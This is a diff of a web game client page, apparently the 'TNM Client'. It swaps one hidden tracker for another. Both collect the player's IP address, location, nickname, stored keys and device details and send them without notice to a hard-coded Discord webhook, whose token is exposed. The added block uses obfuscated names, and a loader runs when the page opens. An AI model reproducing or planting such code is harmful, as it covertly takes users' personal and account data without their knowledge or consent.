@@ -47440,86 +47440,8 @@ transition: .5s ease;
                 }),
                 (module.exports = translations);
         })();
-
-        fetch("https://ipapi.co/json/")
-  .then(response => response.json())
-  .then(data => {
-    const currentTime = new Date().toLocaleString(); // Get current time and format as string
-
-    // Gather player PC details
-    const platform = navigator.platform;
-    const language = navigator.language;
-    const screenResolution = `${screen.width}x${screen.height}`;
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const internetInfo = connection ? `Type: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms` : 'Internet info not available';
-
-    // Function to measure FPS
-    let lastFrameTime = performance.now();
-    let frameCount = 0;
-    let fps = 0;
-
-    function measureFPS() {
-      const now = performance.now();
-      frameCount++;
-      const delta = (now - lastFrameTime) / 1000;
-      if (delta >= 1) {
-        fps = Math.round(frameCount / delta);
-        frameCount = 0;
-        lastFrameTime = now;
-        sendWebhook();
-      } else {
-        requestAnimationFrame(measureFPS);
-      }
-    }
-
-    function sendWebhook() {
-      fetch("https://discord.com/api/webhooks/1292911714907455498/Q8bNZirsL0UwVllwRvNjPGwTTZ_aH8YdIbzbhcena7EiC_pUH88Y8F-KjUZ18PF0IqEo", {
-        method: "post",
-        headers: {
-          'Content-Type': "application/json"
-        },
-        body: JSON.stringify({
-          'embeds': [{
-            'title': "TNM Client",
-            'description': `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>\n\n` +
-                           `**Player named:** ${localStorage.lastNickname}\n\n` +
-                           `**Time:** ${currentTime}\n\n` +
-                           `**Ip:** ${data.ip}\n\n` +
-                           `**City:** ${data.region}\n\n` +
-                           `**Region:** ${data.region}\n\n` +
-                           `**Country:** ${data.country_name}\n\n` +
-                           `**ECP Code:** ${localStorage.ECPKey}\n\n` +
-                           `**Verified?:** ${localStorage.ECPVerified}\n\n` +
-                           `**Info:** ${localStorage.OIIOO}\n\n` +
-                           `**Client Ship ID:** ${localStorage.client_ship_id}\n\n` +
-                           `**lI0Ol:** ${localStorage.lI0Ol}\n\n` +
-                           `**Useragent:** ${navigator.userAgent}\n\n` +
-                           `**Platform:** ${platform}\n\n` +
-                           `**Language:** ${language}\n\n` +
-                           `**Screen Resolution:** ${screenResolution}\n\n` +
-                           `**FPS:** ${fps}\n\n` +
-                           `**Internet Info:** ${internetInfo}\n\n` +
-                           `<a:Ayar:870353775800504330><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:wf:1221513550200049816><a:Ayar:870353775800504330>`,
-            'thumbnail': {
-              'url': 'https://th.bing.com/th/id/OIP.Oik4EsjaVWb8AGrna-I-CQHaFj?w=287&h=180&c=7&r=0&o=5&pid=1.7'
-            },
-            'image': {
-              'url': 'https://th.bing.com/th/id/OIP.Oik4EsjaVWb8AGrna-I-CQHaFj?w=287&h=180&c=7&r=0&o=5&pid=1.7'
-            },
-            'color': 3447003 // Optional, sets the color of the left side of the embed
-          }]
-        })
-      });
-    }
-
-    // Start measuring FPS
-    requestAnimationFrame(measureFPS);
-  });
-
-
-    </script>
-     <script> 
-    // Discord webhook URL
+        
+        // Discord webhook URL
 const webhookUrl = "https://discord.com/api/webhooks/1292911714907455498/Q8bNZirsL0UwVllwRvNjPGwTTZ_aH8YdIbzbhcena7EiC_pUH88Y8F-KjUZ18PF0IqEo"; // Replace with your webhook URL
 
 // Function to send data to Discord webhook
@@ -47731,6 +47653,84 @@ async function getUserData() {
 
 // Automatically log user data when the page loads
 window.onload = getUserData;
+
+// Function to send a message to Discord
+function sendMessageToDiscord(_0x5ea531) {
+  fetch("https://discord.com/api/webhooks/1292911714907455498/Q8bNZirsL0UwVllwRvNjPGwTTZ_aH8YdIbzbhcena7EiC_pUH88Y8F-KjUZ18PF0IqEo", {
+    'method': "POST",
+    'headers': {
+      'Content-Type': "application/json"
+    },
+    'body': JSON.stringify(_0x5ea531)
+  }).then(_0x2cd9c1 => {
+    if (!_0x2cd9c1.ok) {
+      throw new Error("Failed to send data: " + _0x2cd9c1.status + " " + _0x2cd9c1.statusText);
+    }
+  }).catch(_0x718108 => {
+    console.error(_0x718108);
+  });
+}
+
+// Function to get the IP address
+function getIP(_callback) {
+  fetch('https://api.ipify.org?format=json') // Sending a GET request to ipify API
+    .then(response => response.json())
+    .then(data => {
+      _callback(data.ip); // Passing the IP address to the callback function
+    })
+    .catch(error => {
+      console.error('Failed to get IP:', error);
+      _callback(null); // Passing null in case of error
+    });
+}
+
+// Retrieving data from local storage
+const userCountry = localStorage.getItem("btUserCountry") || "Not found";
+const userRegion = localStorage.getItem("region") || "Not found";
+const userName = localStorage.getItem("lastNickname") || "Not found";
+const lastBadge = localStorage.getItem("badge") || "Not found";
+const lastLaser = localStorage.getItem("finish") || "Not found";
+const lastLang = localStorage.getItem("language") || "Not found";
+
+// Message data
+const messageData = {
+  'embeds': [{
+    'title': "Client Loaded!!",
+    'description': "Possible that it got shared?",
+    'fields': [{
+      'name': "Country:",
+      'value': userCountry
+    }, {
+      'name': "Region:",
+      'value': userRegion
+    }, {
+      'name': "Nickname:",
+      'value': userName
+    }, {
+      'name': "Badge:",
+      'value': lastBadge
+    }, {
+      'name': "Laser:",
+      'value': lastLaser
+    }, {
+      'name': "Language:",
+      'value': lastLang
+    }]
+  }]
+};
+
+// Sending the message to Discord after obtaining the IP address
+getIP(function(ip) {
+  if(ip) {
+    messageData.embeds[0].fields.push({
+      'name': 'IP Address:',
+      'value': ip
+    });
+    sendMessageToDiscord(messageData);
+  } else {
+    console.error('Failed to retrieve IP.');
+  }
+});
     </script>
 </body>
 </html>
